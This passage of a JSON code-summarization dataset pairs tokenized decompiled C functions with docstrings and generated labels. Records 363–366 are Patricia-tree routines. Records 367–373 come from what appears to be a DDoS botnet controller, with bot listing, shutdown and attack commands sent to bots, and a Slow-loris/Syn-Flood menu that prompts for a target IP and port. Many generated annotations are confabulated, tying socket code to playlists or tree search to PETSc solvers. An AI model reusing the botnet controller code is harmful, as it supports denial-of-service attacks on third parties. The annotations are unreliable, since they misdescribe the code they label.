            "_assert_fail",
            "(",
            "\"patricia->head == node\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x386u",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "patricia",
            "-",
            ">",
            "head",
            "=",
            "childa",
            ";",
            "}",
            "}",
            "else",
            "{",
            "parent",
            "=",
            "node",
            "-",
            ">",
            "parent",
            ";",
            "Deref_Prefix",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            ";",
            "free",
            "(",
            "node",
            ")",
            ";",
            "-",
            "-",
            "patricia",
            "-",
            ">",
            "num_active_node",
            ";",
            "if",
            "(",
            "parent",
            ")",
            "{",
            "if",
            "(",
            "node",
            "=",
            "=",
            "parent",
            "-",
            ">",
            "r",
            ")",
            "{",
            "parent",
            "-",
            ">",
            "r",
            "=",
            "0L",
            "L",
            ";",
            "child",
            "=",
            "parent",
            "-",
            ">",
            "l",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "node",
            "!",
            "=",
            "parent",
            "-",
            ">",
            "l",
            ")",
            "_assert_fail",
            "(",
            "\"parent->l == node\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x358u",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "parent",
            "-",
            ">",
            "l",
            "=",
            "0L",
            "L",
            ";",
            "child",
            "=",
            "parent",
            "-",
            ">",
            "r",
            ";",
            "}",
            "if",
            "(",
            "!",
            "parent",
            "-",
            ">",
            "prefix",
            ")",
            "{",
            "if",
            "(",
            "parent",
            "-",
            ">",
            "parent",
            ")",
            "{",
            "if",
            "(",
            "parent",
            "=",
            "=",
            "parent",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "r",
            ")",
            "{",
            "parent",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "r",
            "=",
            "child",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "parent",
            "!",
            "=",
            "parent",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "l",
            ")",
            "_assert_fail",
            "(",
            "\"parent->parent->l == parent\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x36Au",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "parent",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "l",
            "=",
            "child",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "parent",
            "!",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ")",
            "_assert_fail",
            "(",
            "\"patricia->head == parent\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x363u",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "patricia",
            "-",
            ">",
            "head",
            "=",
            "child",
            ";",
            "}",
            "child",
            "-",
            ">",
            "parent",
            "=",
            "parent",
            "-",
            ">",
            "parent",
            ";",
            "free",
            "(",
            "parent",
            ")",
            ";",
            "-",
            "-",
            "patricia",
            "-",
            ">",
            "num_active_node",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "node",
            "!",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ")",
            "_assert_fail",
            "(",
            "\"patricia->head == node\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x34Eu",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "patricia",
            "-",
            ">",
            "head",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function f_Pref likely calculates or manipulates preferences, possibly within a larger program or system, but without the provided code snippets, it's difficult to ascertain its specific functionality."
        ],
        "longer_label": "The provided code defines a function `patricia_remove` for removing nodes from a Patricia tree data structure, with annotations suggesting the involvement of a function `f_Pref` related to preferences within a larger program or system."
    },
    {
        "id": 363,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "creates",
            "a",
            "prefix",
            "using",
            "the",
            "given",
            "address",
            "family",
            "and",
            "string",
            ",",
            "looks",
            "up",
            "the",
            "prefix",
            "in",
            "a",
            "patricia",
            "tree",
            ",",
            "and",
            "returns",
            "the",
            "corresponding",
            "node",
            "."
        ],
        "code_tokens": [
            "patricia_node_t",
            "*",
            "FUN0",
            "make_and_lookup",
            "(",
            "patricia_tree_t",
            "*",
            "tree",
            ",",
            "int",
            "afi",
            ",",
            "char",
            "*",
            "string",
            ")",
            "{",
            "prefix_t",
            "*",
            "prefix",
            ";",
            "patricia_node_t",
            "*",
            "node",
            ";",
            "prefix",
            "=",
            "ascii2prefix",
            "(",
            "afi",
            ",",
            "string",
            ")",
            ";",
            "node",
            "=",
            "patricia_lookup",
            "(",
            "tree",
            ",",
            "prefix",
            ")",
            ";",
            "Deref_Prefix",
            "(",
            "prefix",
            ")",
            ";",
            "return",
            "node",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_and_lookup` function appears to be utilized for searching and potentially creating entries within a hash table-like data structure, often associated with file system operations or network routing, using a specified key or identifier."
        ],
        "longer_label": "The `make_and_lookup` function takes a prefix tree and a string, converts the string to a prefix, performs a lookup in the tree, potentially creating a new node if not found, and returns the resulting node."
    },
    {
        "id": 364,
        "docstring_tokens": [
            "The",
            "code",
            "searches",
            "for",
            "an",
            "exact",
            "match",
            "of",
            "a",
            "given",
            "string",
            "in",
            "a",
            "patricia",
            "tree",
            "and",
            "returns",
            "the",
            "corresponding",
            "node",
            ",",
            "printing",
            "a",
            "message",
            "if",
            "the",
            "node",
            "is",
            "found",
            "or",
            "not",
            "found",
            "."
        ],
        "code_tokens": [
            "patricia_node_t",
            "*",
            "FUN0",
            "try_search_exact",
            "(",
            "patricia_tree_t",
            "*",
            "tree",
            ",",
            "int",
            "afi",
            ",",
            "char",
            "*",
            "string",
            ")",
            "{",
            "prefix_t",
            "*",
            "prefix",
            ";",
            "patricia_node_t",
            "*",
            "node",
            ";",
            "prefix",
            "=",
            "ascii2prefix",
            "(",
            "afi",
            ",",
            "string",
            ")",
            ";",
            "node",
            "=",
            "patricia_search_exact",
            "(",
            "tree",
            ",",
            "prefix",
            ")",
            ";",
            "Deref_Prefix",
            "(",
            "prefix",
            ")",
            ";",
            "return",
            "node",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_search` function appears to be part of a library or system that includes operations related to searching for and managing elements within a set or collection, likely implemented using iterators and supporting functions for searching, detecting duplicates, and possibly other operations.",
            "The \"exact\" function is likely intended to compute the exact solution \\( x_{\\text{exact}} \\) of a linear system \\( Ax = b \\), possibly using LU decomposition, as part of a larger program solving linear systems using the PETSc library.",
            "The `search` function appears to be used for different purposes in the provided code snippets: in the first snippet, it's used for searching a key in a binary search tree; in the second snippet, it's used for searching a path in a grid; and in the third snippet, it seems to be related to searching symbols, fixups, and hints within some larger system, possibly a linker or a debugger."
        ],
        "longer_label": "The provided code defines a function `try_search_exact` within a library or system, intended for searching for exact matches in a data structure, likely a patricia tree, as part of operations related to managing elements within a collection, while annotations suggest potential applications including linear system solution computation and symbol searching within a larger system."
    },
    {
        "id": 365,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "looks",
            "up",
            "a",
            "node",
            "in",
            "a",
            "Patricia",
            "tree",
            "based",
            "on",
            "the",
            "address",
            "family",
            "identifier",
            "and",
            "a",
            "string",
            ",",
            "and",
            "if",
            "the",
            "node",
            "is",
            "found",
            ",",
            "it",
            "is",
            "removed",
            "from",
            "the",
            "tree",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "patricia_tree_t",
            "*",
            "tree",
            ",",
            "int",
            "afi",
            ",",
            "char",
            "*",
            "string",
            ")",
            "{",
            "patricia_node_t",
            "*",
            "node",
            ";",
            "node",
            "=",
            "try_search_exact",
            "(",
            "tree",
            ",",
            "afi",
            ",",
            "string",
            ")",
            ";",
            "if",
            "(",
            "node",
            ")",
            "patricia_remove",
            "(",
            "tree",
            ",",
            "node",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `then_remove` appears to measure performance metrics for operations like adding, searching, and removing items from data structures like SIMDHash or Patricia trees, likely for benchmarking or optimization purposes, based on the provided code snippets and external function declarations.",
            "The `_search` function appears to be a part of a larger system, potentially related to device communication or data manipulation, with different implementations possibly for data structures like sets and playlists, suggesting a search operation likely utilized within these contexts."
        ],
        "longer_label": "The code defines a function, `lookup_then_remove`, which utilizes a `try_search_exact` function to search for a node in a Patricia tree based on provided criteria, and if found, removes the node from the tree."
    },
    {
        "id": 366,
        "docstring_tokens": [
            "The",
            "function",
            "try_search_best",
            "searches",
            "for",
            "the",
            "best",
            "matching",
            "prefix",
            "in",
            "a",
            "given",
            "patricia",
            "tree",
            "based",
            "on",
            "the",
            "address",
            "family",
            "identifier",
            "and",
            "string",
            "input",
            ",",
            "printing",
            "out",
            "the",
            "search",
            "results",
            "in",
            "a",
            "specific",
            "format",
            "."
        ],
        "code_tokens": [
            "patricia_node_t",
            "*",
            "FUN0",
            "try_search_best",
            "(",
            "patricia_tree_t",
            "*",
            "tree",
            ",",
            "int",
            "afi",
            ",",
            "char",
            "*",
            "string",
            ")",
            "{",
            "unsigned",
            "int",
            "bitlen",
            ";",
            "char",
            "*",
            "v4",
            ";",
            "unsigned",
            "int",
            "v5",
            ";",
            "char",
            "*",
            "v6",
            ";",
            "prefix_t",
            "*",
            "prefix",
            ";",
            "patricia_node_t",
            "*",
            "node",
            ";",
            "prefix",
            "=",
            "ascii2prefix",
            "(",
            "afi",
            ",",
            "string",
            ")",
            ";",
            "bitlen",
            "=",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "v4",
            "=",
            "prefix_toa",
            "(",
            "prefix",
            ")",
            ";",
            "printf",
            "(",
            "\"try_search_best: %s/%d\\n\"",
            ",",
            "v4",
            ",",
            "bitlen",
            ")",
            ";",
            "node",
            "=",
            "patricia_search_best",
            "(",
            "tree",
            ",",
            "prefix",
            ")",
            ";",
            "if",
            "(",
            "node",
            ")",
            "{",
            "v5",
            "=",
            "node",
            "-",
            ">",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "v6",
            "=",
            "prefix_toa",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            ";",
            "printf",
            "(",
            "\"try_search_best: %s/%d found\\n\"",
            ",",
            "v6",
            ",",
            "v5",
            ")",
            ";",
            "}",
            "else",
            "{",
            "puts",
            "(",
            "\"try_search_best: not found\"",
            ")",
            ";",
            "}",
            "Deref_Prefix",
            "(",
            "prefix",
            ")",
            ";",
            "return",
            "node",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The printf function is used for printing formatted text to the console, and in the provided code snippets, it is used to output \"Hello World\" in a C program.",
            "The `patricia_search` function is part of a data structure library for implementing a radix tree (Patricia tree) and is used to traverse the tree to find a potential match for a given key.",
            "The `prefix` function seems to be designed to compare two strings character by character until they differ, indicating a common prefix, which could be utilized in file manipulation or function name prefixing within a codebase."
        ],
        "longer_label": "The provided code defines a function `try_search_best` that uses a Patricia tree data structure to search for the best matching node based on a given address family identifier (`afi`) and string, printing debug information about the search process and the outcome if a match is found."
    },
    {
        "id": 367,
        "docstring_tokens": [
            "The",
            "start",
            "function",
            "presents",
            "a",
            "menu",
            "of",
            "options",
            "to",
            "the",
            "user",
            ",",
            "allowing",
            "them",
            "to",
            "choose",
            "between",
            "launching",
            "a",
            "DDos",
            "attack",
            ",",
            "listing",
            "all",
            "the",
            "bots",
            ",",
            "or",
            "quitting",
            "the",
            "program",
            ",",
            "with",
            "corresponding",
            "actions",
            "taken",
            "based",
            "on",
            "the",
            "user",
            "'s",
            "input",
            "."
        ],
        "code_tokens": [
            "void",
            "__noreturn",
            "FUN0",
            "(",
            ")",
            "{",
            "char",
            "s",
            "[",
            "5",
            "]",
            ";",
            "char",
            "v1",
            "[",
            "88",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "v2",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "strcpy",
            "(",
            "v1",
            ",",
            "\"\\x1B[0;34mOptions:\\n\\t[1] DDos\\n\\t[2] List All the Bots\\nChoose a # from the list: \\x1B[0m\"",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "printf",
            "(",
            "\"%s\"",
            ",",
            "v1",
            ")",
            ";",
            "fgets",
            "(",
            "s",
            ",",
            "5",
            ",",
            "stdin",
            ")",
            ";",
            "if",
            "(",
            "s",
            "[",
            "0",
            "]",
            "=",
            "=",
            "49",
            ")",
            "break",
            ";",
            "if",
            "(",
            "s",
            "[",
            "0",
            "]",
            "=",
            "=",
            "50",
            ")",
            "{",
            "ls_all_bots",
            "(",
            ")",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "s",
            "[",
            "0",
            "]",
            "=",
            "=",
            "113",
            ")",
            "{",
            "puts",
            "(",
            "\"[+] Shutting down all services\"",
            ")",
            ";",
            "close_all",
            "(",
            ")",
            ";",
            "}",
            "puts",
            "(",
            "\"\\x1B[0;31m[-] Wrong Choice!\\x1B[0m\"",
            ")",
            ";",
            "}",
            "}",
            "ddos",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsq` is used to read a quadword (64 bits) from the FS segment register, commonly utilized for accessing thread-local storage or other processor-specific information in x86 assembly language programming.",
            "The `ls_all` function appears to be a utility function used in different contexts within various code snippets, likely implementing functionality related to listing files or directories with sorting options and handling different encodings or contexts.",
            "The function \"servicesclose\" likely closes or terminates certain services or resources, but without code snippets to analyze, it's challenging to provide a more specific explanation."
        ],
        "longer_label": "The code defines a start function that reads system-specific information, presents a menu for various actions including DDoS and listing bots, handles user input to execute corresponding actions or terminate services, and then initiates a DDoS attack."
    },
    {
        "id": 368,
        "docstring_tokens": [
            "This",
            "code",
            "encrypts",
            "a",
            "file",
            "using",
            "AES",
            "256",
            "CBC",
            "encryption",
            "with",
            "a",
            "given",
            "key",
            "and",
            "initialization",
            "vector",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "FILE",
            "*",
            "input",
            ",",
            "FILE",
            "*",
            "output",
            ",",
            "unsigned",
            "__int8",
            "*",
            "key",
            ",",
            "unsigned",
            "__int8",
            "*",
            "iv",
            ")",
            "{",
            "__int64",
            "v4",
            ";",
            "int",
            "outLen",
            ";",
            "unsigned",
            "__int8",
            "outbuff",
            "[",
            "16",
            "]",
            ";",
            "unsigned",
            "__int8",
            "inbuff",
            "[",
            "16",
            "]",
            ";",
            "int",
            "bytesWritten",
            ";",
            "int",
            "bytesRead",
            ";",
            "EVP_CIPHER_CTX",
            "*",
            "ctx",
            ";",
            "ctx",
            "=",
            "(",
            "EVP_CIPHER_CTX",
            "*",
            ")",
            "EVP_CIPHER_CTX_new",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "ctx",
            ")",
            "handleErrors",
            "(",
            ")",
            ";",
            "v4",
            "=",
            "EVP_aes_256_cbc",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "EVP_EncryptInit_ex",
            "(",
            "ctx",
            ",",
            "v4",
            ",",
            "0L",
            "L",
            ",",
            "key",
            ",",
            "iv",
            ")",
            ")",
            "handleErrors",
            "(",
            ")",
            ";",
            "do",
            "{",
            "bytesRead",
            "=",
            "fread",
            "(",
            "inbuff",
            ",",
            "1uL",
            "L",
            ",",
            "0x10uL",
            "L",
            ",",
            "input",
            ")",
            ";",
            "if",
            "(",
            "bytesRead",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "printf",
            "(",
            "\"Could not read file\"",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "EVP_EncryptUpdate",
            "(",
            "ctx",
            ",",
            "outbuff",
            ",",
            "&",
            "outLen",
            ",",
            "inbuff",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "bytesRead",
            ")",
            "!",
            "=",
            "1",
            ")",
            "handleErrors",
            "(",
            ")",
            ";",
            "bytesWritten",
            "=",
            "fwrite",
            "(",
            "outbuff",
            ",",
            "1uL",
            "L",
            ",",
            "outLen",
            ",",
            "output",
            ")",
            ";",
            "if",
            "(",
            "bytesWritten",
            "=",
            "=",
            "-",
            "1",
            ")",
            "printf",
            "(",
            "\"Could not write to file\"",
            ")",
            ";",
            "}",
            "while",
            "(",
            "bytesRead",
            ">",
            "15",
            ")",
            ";",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "EVP_EncryptFinal_ex",
            "(",
            "ctx",
            ",",
            "outbuff",
            ",",
            "&",
            "outLen",
            ")",
            ")",
            "{",
            "printf",
            "(",
            "\"Error on the last block of data\"",
            ")",
            ";",
            "handleErrors",
            "(",
            ")",
            ";",
            "}",
            "bytesWritten",
            "=",
            "fwrite",
            "(",
            "outbuff",
            ",",
            "1uL",
            "L",
            ",",
            "outLen",
            ",",
            "output",
            ")",
            ";",
            "if",
            "(",
            "bytesWritten",
            "=",
            "=",
            "-",
            "1",
            ")",
            "printf",
            "(",
            "\"Could not write the last block to file\"",
            ")",
            ";",
            "EVP_CIPHER_CTX_free",
            "(",
            "ctx",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The _CIPHER_CTX_ function is used to initialize and manage the context for encryption and decryption operations using different cryptographic libraries such as OpenSSL.",
            "The function aes_256 is used for AES encryption with a 256-bit key length, and it is called to initialize the encryption context, perform the encryption, and finalize the encryption process.",
            "The function `EVP_EncryptInit` is used to initialize an encryption operation with the specified cipher, key, and initialization vector (IV) in OpenSSL's EVP (Envelope) interface for encryption.",
            "The `bytes` function appears to be part of a larger codebase related to memory management or buffer manipulation, involving operations like reallocating memory, copying data, and handling chunks, possibly for an array or buffer management system.",
            "The function `fread` is being manipulated through hooking and conditional checks within the code snippets, potentially redirecting its behavior based on certain conditions, such as checking for a specific string in the file name or group ID, and then either returning early or invoking the original `fread` function.",
            "The function `printf` appears to be defined as part of a larger codebase, including macros and typedefs for a Reverse Polish Notation (RPN) calculator, and is later included in a formatting library, suggesting its usage for displaying formatted output in C programs.",
            "Based on the function name \"\u0120file\" and the provided code snippets, it appears to be a function for handling file operations such as reading, writing, or manipulating files in some way.",
            "The function `VP_Encrypt` is likely a wrapper for OpenSSL's EVP encryption functions, primarily used for initializing encryption contexts, handling encryption padding, and managing input/output buffers for AES-256 GCM encryption with OpenSSL in a Python extension module."
        ],
        "longer_label": "The provided code utilizes OpenSSL's EVP interface to encrypt a file using AES-256 in CBC mode, handling initialization, encryption, and finalization operations within a loop, while managing the encryption context using the EVP_CIPHER_CTX functions."
    },
    {
        "id": 369,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "main",
            "socket",
            ",",
            "binds",
            "it",
            "to",
            "a",
            "server",
            "address",
            ",",
            "sets",
            "it",
            "to",
            "listen",
            "with",
            "a",
            "backlog",
            "of",
            "8",
            ",",
            "and",
            "creates",
            "a",
            "new",
            "thread",
            "to",
            "handle",
            "incoming",
            "connections",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "main_sock",
            "=",
            "make_socket",
            "(",
            ")",
            ";",
            "bind_socket",
            "(",
            "&",
            "serverAddr",
            ")",
            ";",
            "listen",
            "(",
            "main_sock",
            ",",
            "8",
            ")",
            ";",
            "return",
            "pthread_create",
            "(",
            "&",
            "accept_thread",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "accept_handler",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `intinit` function is defined in two code snippets, indicating its usage for initializing integer types in a C program, handling execution context, and possibly error handling.",
            "The function \"sockmake_socketbind_socket\" likely creates a socket and binds it to a specific address and port for network communication.",
            "The function `_create` appears to be part of a program related to managing playlists, where it iterates over files in a directory, loads them as playlists, and continues if encountering non-regular files, while `pl_create_default` function creates a default playlist."
        ],
        "longer_label": "The provided code initializes a main socket for network communication, binds it to a specified address and port, listens for incoming connections, and creates a thread to handle accepting connections, likely forming part of a program managing playlists with functions for iterating over files in a directory and creating default playlists."
    },
    {
        "id": 370,
        "docstring_tokens": [
            "The",
            "code",
            "closes",
            "all",
            "connections",
            ",",
            "sends",
            "a",
            "shutdown",
            "message",
            "to",
            "bots",
            ",",
            "and",
            "exits",
            "the",
            "program",
            "."
        ],
        "code_tokens": [
            "void",
            "__noreturn",
            "FUN0",
            "(",
            ")",
            "{",
            "char",
            "*",
            "v0",
            ";",
            "struct",
            "in_addr",
            "*",
            "v1",
            ";",
            "pthread_kill",
            "(",
            "accept_thread",
            ",",
            "2",
            ")",
            ";",
            "puts",
            "(",
            "\"[+] Accepting Closed\"",
            ")",
            ";",
            "v1",
            "=",
            "(",
            "struct",
            "in_addr",
            "*",
            ")",
            "&",
            "cons",
            ";",
            "send_to_bots",
            "(",
            "\"[!SHUTDOWN!]\"",
            ")",
            ";",
            "while",
            "(",
            "v1",
            "&",
            "&",
            "v1",
            "-",
            ">",
            "s_addr",
            ")",
            "{",
            "close",
            "(",
            "v1",
            "-",
            ">",
            "s_addr",
            ")",
            ";",
            "v0",
            "=",
            "inet_ntoa",
            "(",
            "v1",
            "[",
            "2",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"[i] Connection Closed From : %s\\n\"",
            ",",
            "v0",
            ")",
            ";",
            "v1",
            "=",
            "*",
            "(",
            "struct",
            "in_addr",
            "*",
            "*",
            ")",
            "&",
            "v1",
            "[",
            "6",
            "]",
            ".",
            "s_addr",
            ";",
            "}",
            "close",
            "(",
            "main_sock",
            ")",
            ";",
            "_exit",
            "(",
            "0",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `inet_ntoa` function is used to convert an IPv4 address from its binary representation in `struct in_addr` to a human-readable string format.",
            "The \"close\" function is used within a C/C++ program to close file descriptors or file streams opened using the \"open\" function, ensuring proper resource management and releasing system resources associated with those files."
        ],
        "longer_label": "The provided C code defines a function `close_all()` that terminates an accepting thread, sends a shutdown signal to connected bots, closes all connections by iterating over the addresses stored in `cons`, closes the main socket, and exits the program."
    },
    {
        "id": 371,
        "docstring_tokens": [
            "The",
            "sig_handler",
            "function",
            "handles",
            "the",
            "SIGINT",
            "signal",
            "by",
            "stopping",
            "the",
            "current",
            "DDOS",
            "attack",
            ",",
            "sending",
            "a",
            "message",
            "to",
            "bots",
            ",",
            "resetting",
            "the",
            "signal",
            "handler",
            ",",
            "and",
            "starting",
            "a",
            "new",
            "operation",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "(",
            "int",
            "a1",
            ")",
            "{",
            "if",
            "(",
            "a1",
            "=",
            "=",
            "2",
            ")",
            "{",
            "puts",
            "(",
            "\"[+] Stoping the current DDOS\"",
            ")",
            ";",
            "send_to_bots",
            "(",
            "\"[!DDOS!]\"",
            ")",
            ";",
            "signal",
            "(",
            "2",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "start",
            "(",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function OSsend_to likely facilitates the sending of data or messages to a specified destination within an operating system, though without the actual code snippets, it's challenging to provide a precise analysis."
        ],
        "longer_label": "The provided code snippet defines a signal handler function that, upon receiving a signal with code 2, stops the current DDOS operation, sends a message to bots, resets the signal handler, and restarts the DDOS process."
    },
    {
        "id": 372,
        "docstring_tokens": [
            "The",
            "code",
            "converts",
            "a",
            "hostname",
            "to",
            "an",
            "IP",
            "address",
            "using",
            "the",
            "gethostbyname",
            "and",
            "inet_ntoa",
            "functions",
            "and",
            "returns",
            "either",
            "0",
            "or",
            "1",
            "based",
            "on",
            "success",
            "or",
            "failure",
            "."
        ],
        "code_tokens": [
            "__int64",
            "__fastcall",
            "FUN0",
            "(",
            "const",
            "char",
            "*",
            "a1",
            ",",
            "char",
            "*",
            "a2",
            ")",
            "{",
            "char",
            "*",
            "v3",
            ";",
            "struct",
            "hostent",
            "*",
            "v4",
            ";",
            "struct",
            "in_addr",
            "*",
            "*",
            "h_addr_list",
            ";",
            "v4",
            "=",
            "gethostbyname",
            "(",
            "a1",
            ")",
            ";",
            "if",
            "(",
            "v4",
            ")",
            "{",
            "h_addr_list",
            "=",
            "(",
            "struct",
            "in_addr",
            "*",
            "*",
            ")",
            "v4",
            "-",
            ">",
            "h_addr_list",
            ";",
            "if",
            "(",
            "*",
            "h_addr_list",
            ")",
            "{",
            "v3",
            "=",
            "inet_ntoa",
            "(",
            "(",
            "struct",
            "in_addr",
            ")",
            "(",
            "*",
            "h_addr_list",
            ")",
            "-",
            ">",
            "s_addr",
            ")",
            ";",
            "strcpy",
            "(",
            "a2",
            ",",
            "v3",
            ")",
            ";",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "{",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "}",
            "else",
            "{",
            "perror",
            "(",
            "\"gethostbyname\"",
            ")",
            ";",
            "return",
            "1L",
            "L",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `gethostbyname` is a DNS interface wrapper used to retrieve information about a host by its name, facilitating network communication in a system with LWIP network stack and DNS support.",
            "The `inet_ntoa` function is used to convert an IPv4 address from its 32-bit binary representation to a \"dotted quad\" string format.",
            "The perror function is used to print a descriptive error message to stderr, based on the value of errno, typically when a system call fails, as demonstrated in the given code snippet where it prints an error message if the write system call fails."
        ],
        "longer_label": "The provided code is a function that takes a hostname as input, retrieves its corresponding IP address using the `gethostbyname` function, converts the IP address to a string format using `inet_ntoa`, and copies it to a buffer, while handling potential errors with descriptive messages using `perror`."
    },
    {
        "id": 373,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "ddos",
            "(",
            ")",
            "which",
            "allows",
            "the",
            "user",
            "to",
            "select",
            "from",
            "different",
            "types",
            "of",
            "DDoS",
            "attacks",
            "(",
            "Slow-loris",
            ",",
            "Syn-Flood",
            ",",
            "All",
            "Types",
            ")",
            "and",
            "specify",
            "target",
            "IP/URL",
            ",",
            "port",
            ",",
            "and",
            "number",
            "of",
            "threads",
            "to",
            "launch",
            "the",
            "attack",
            ",",
            "with",
            "an",
            "option",
            "to",
            "shut",
            "down",
            "all",
            "services",
            "."
        ],
        "code_tokens": [
            "void",
            "__noreturn",
            "FUN0",
            "(",
            ")",
            "{",
            "char",
            "v0",
            "[",
            "4",
            "]",
            ";",
            "char",
            "s",
            "[",
            "5",
            "]",
            ";",
            "char",
            "v2",
            "[",
            "6",
            "]",
            ";",
            "char",
            "dest",
            "[",
            "14",
            "]",
            ";",
            "char",
            "v4",
            "[",
            "32",
            "]",
            ";",
            "char",
            "v5",
            "[",
            "32",
            "]",
            ";",
            "char",
            "v6",
            "[",
            "64",
            "]",
            ";",
            "char",
            "v7",
            "[",
            "80",
            "]",
            ";",
            "char",
            "v8",
            "[",
            "104",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "signal",
            "(",
            "2",
            ",",
            "sig_handler",
            ")",
            ";",
            "strcpy",
            "(",
            "v8",
            ",",
            "\"\\x1B[0;33mDDos Options:\\n\"",
            "\"\\t[1] Slow-loris\\n\"",
            "\"\\t[2] Syn-Flood\\n\"",
            "\"\\t[3] All Types\\n\"",
            "\"Select a number from above # : \\x1B[0m\"",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "printf",
            "(",
            "\"%s\"",
            ",",
            "v8",
            ")",
            ";",
            "fgets",
            "(",
            "s",
            ",",
            "5",
            ",",
            "stdin",
            ")",
            ";",
            "memset",
            "(",
            "v6",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "v6",
            ")",
            ")",
            ";",
            "if",
            "(",
            "s",
            "[",
            "0",
            "]",
            "=",
            "=",
            "49",
            ")",
            "break",
            ";",
            "switch",
            "(",
            "s",
            "[",
            "0",
            "]",
            ")",
            "{",
            "case",
            "'2'",
            ":",
            "puts",
            "(",
            "\"\\x1B[1;36m[*] Selected DDos -> Syn-Flood\"",
            ")",
            ";",
            "strncpy",
            "(",
            "dest",
            ",",
            "\"SYN-FLOOD\"",
            ",",
            "0xCuL",
            "L",
            ")",
            ";",
            "printf",
            "(",
            "\"\\nTarget to DDos[IP form]: \"",
            ")",
            ";",
            "fgets",
            "(",
            "v4",
            ",",
            "20",
            ",",
            "stdin",
            ")",
            ";",
            "v4",
            "[",
            "strlen",
            "(",
            "v4",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
            "\"Target Port: \"",
            ")",
            ";",
            "fgets",
            "(",
            "v2",
            ",",
            "6",
            ",",
            "stdin",
            ")",
            ";",
            "v2",
            "[",
            "strlen",
            "(",
            "v2",
            ")",
            "-",
            "1",
            "]",
            "=",
            "0",
            ";",
            "printf",
            "(",
